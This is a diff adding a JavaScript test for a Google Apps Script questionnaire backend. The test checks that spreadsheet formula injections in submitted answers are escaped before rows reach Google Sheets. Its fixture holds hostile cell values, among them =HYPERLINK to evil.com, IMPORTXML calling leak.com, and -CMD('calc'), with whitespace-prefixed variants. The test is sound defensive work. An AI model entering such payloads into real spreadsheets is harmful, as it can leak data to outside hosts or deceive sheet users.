@@ -693,3 +693,66 @@ assert.strictEqual(lockRes.code, 'lock_timeout', 'Lock timeout returns code:lock
 assert.strictEqual(hydraSheet.getLastRow(), lockRowsBefore, 'Zero rows appended on lock timeout');
 
 console.log('ALL PHASE 14.8 IDEMPOTENCE, RATE LIMITING & LOCK TIMEOUT JS TESTS PASSED.');
+
+// Test M: Exhaustive Neutralization of Formula Injections in Google Sheets (Phase 14.9)
+const formulaPayloadSommeil = {
+  session_id: '12344321-1234-4321-8234-123443211234',
+  completed_at: '2026-09-09T19:00:00Z',
+  questionnaire_id: 'sommeil',
+  questionnaire_version: '+1.0.0', // formula +
+  answers: {
+    'SL01': { value: '7_to_9h', label: '  =HYPERLINK("http://evil.com","7 à 9h")', points: 1, applicable: true }, // formula = with leading spaces
+    'SL02': { value: 'rarement', label: '-CMD("calc")', points: 1, applicable: true } // formula -
+  },
+  safety_answers: {
+    'SLSF01': { value: 'no', label: '\t=IMPORTXML("https://leak.com","//a")', triggers: [] }, // formula = with tab
+    'SLSF02': { value: 'no', label: '@SUM(A1:A10)', triggers: [] } // formula @
+  },
+  raw_score: 12,
+  available_max: 60,
+  final_score: 12,
+  calculated_category: 'SOMMEIL_SATISFAISANT',
+  displayed_category: '\n+DANGEROUS_CATEGORY', // formula + with leading newline
+  safety_flags: []
+};
+
+const sommeilSheet = mockSpreadsheet.getSheetByName('Sommeil');
+assert.strictEqual(sommeilSheet.getLastRow(), 0, 'Sommeil sheet starts empty');
+const sommeilRes = JSON.parse(gasEnv.doPost({ postData: { contents: JSON.stringify(formulaPayloadSommeil) } }).text);
+assert.strictEqual(sommeilRes.ok, true, 'Formula payload accepted and neutralized');
+assert.strictEqual(sommeilSheet.getLastRow(), 2, 'Header row + 1 data row created for Sommeil');
+assert.strictEqual(sommeilSheet.rows[0].length, 35, 'Sommeil header row has 35 columns');
+assert.strictEqual(sommeilSheet.rows[1].length, 35, 'Sommeil data row has 35 columns');
+
+const sommeilFormRow = sommeilSheet.rows[sommeilSheet.rows.length - 1];
+
+// Questionnaire version column (Col 3, index 2)
+assert.strictEqual(sommeilFormRow[2], "'+1.0.0", 'Version with + escaped');
+
+// Scored question SL01 label (Col 4, index 3)
+assert.strictEqual(sommeilFormRow[3], "'  =HYPERLINK(\"http://evil.com\",\"7 à 9h\")", 'Answer label with leading space and = escaped');
+
+// Scored question SL02 label (Col 6, index 5)
+assert.strictEqual(sommeilFormRow[5], "'-CMD(\"calc\")", 'Answer label with - escaped');
+
+// Safety question SLSF01 label (Col 28, index 27)
+assert.strictEqual(sommeilFormRow[27], "'\t=IMPORTXML(\"https://leak.com\",\"//a\")", 'Safety label with tab and = escaped');
+
+// Safety question SLSF02 label (Col 29, index 28)
+assert.strictEqual(sommeilFormRow[28], "'@SUM(A1:A10)", 'Safety label with @ escaped');
+
+// Displayed category (Col 34, index 33)
+assert.strictEqual(sommeilFormRow[33], "'\n+DANGEROUS_CATEGORY", 'Category with newline and + escaped');
+
+// Verify that across the entire row, no string cell begins with bare =+-@ (even with leading whitespace)
+for (let c = 0; c < sommeilFormRow.length; c++) {
+  const cellVal = sommeilFormRow[c];
+  if (typeof cellVal === 'string' && cellVal.length > 0) {
+    assert.ok(
+      !/^\s*[=+\-@]/.test(cellVal),
+      `Cell at index ${c} must NOT start with bare formula character: ${JSON.stringify(cellVal)}`
+    );
+  }
+}
+
+console.log('ALL PHASE 14.9 FORMULA INJECTION NEUTRALIZATION JS TESTS PASSED.');
